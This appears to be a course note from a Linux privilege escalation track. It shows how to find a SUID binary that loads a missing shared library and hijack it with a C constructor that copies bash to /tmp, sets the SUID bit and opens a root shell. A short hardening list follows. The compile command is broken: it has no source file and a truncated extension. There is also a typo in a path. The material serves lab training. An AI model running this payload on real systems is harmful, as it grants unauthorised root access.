# 🛡️ Shared Object Injection

> **Course Track:** [Linux Privilege Escalation](../../README.md)  
> **Module:** [SUID](./README.md)  
> **Topic Path:** `Linux Privilege Escalation > SUID > Shared Object Injection`

---

## 🎯 Technical Overview & Objectives
This section covers the methodology, enumeration techniques, exploit mechanics, and defensive mitigations for **Shared Object Injection**.

---

## 🔬 Practical Notes, Commands & Proof of Exploit

Always start by doing this 

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
This is a fine command that will search for suid permissions

We will try sfo injection in this 

We run this

```bash
ls -la /usr/local/bin/suid-so
```
We see that suid permission is set for root and grp

Then we run the file (sm as mentioned above)
We run it but it seemed like ntg happened 
So we use strace the same file (google for info)

We used this cheetsheat command for a bit more clean and concise response

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```
From the output, notice that a .so file is missing from a writable directory

Found something that stands out

We will try to overwrite it 
This type of escalation is a bit tough we have to see everything and check out and have a lot knowlege abt this 


```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

- **`cp /bin/bash /tmp/bash`**  - Copies the system’s `bash` binary to `/tmp/bash`.- **`chmod +s /tmp/bash`**  - Sets the **SUID bit** on the new bash binary.  - This means whenever `/tmp/bash` is executed, it runs with the **permissions of the file owner** (likely **root** if this is part of an exploit running as root).- **`/tmp/bash -p`**  - Runs the new bash shell with the `p` flag.  - This tells bash to **preserve the effective UID** — allowing it to operate with **root privileges** if the SUID bit is set.
Then gcc this (make the dir first)

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.s
```

| `gcc` | GNU C Compiler |
| --- | --- |

| `-shared` | Tells GCC to create a **shared object (.so)** instead of an executable |
| --- | --- |

| `-fPIC` | Generates **Position Independent Code** (required for shared libraries) |
| --- | --- |

| `-o /home/user/.config/libcalc.so` | Output file — you're creating a `.so` file at this path |
| --- | --- |

Well this is it then
Now we just have to run the 

```bash
/usr/loacal/bin/suid-so
```
And then we can just check our id it will be root


---

## 🛡️ Defensive Hardening & Remediation
- **Audit & Restrict Permissions:** Review `/etc/sudoers`, remove unnecessary SUID/SGID flags (`chmod u-s`), and enforce strict file ownership on configuration files.
- **Kernel Patching:** Regularly apply distribution security updates to mitigate known local privilege escalation (LPE) vulnerabilities.
- **Principle of Least Privilege:** Avoid running non-administrative daemon processes as `root` and isolate services using containers/namespaces.

---
[⬅ Back to SUID](./README.md) • [🏠 Master Course Index](../README.md)
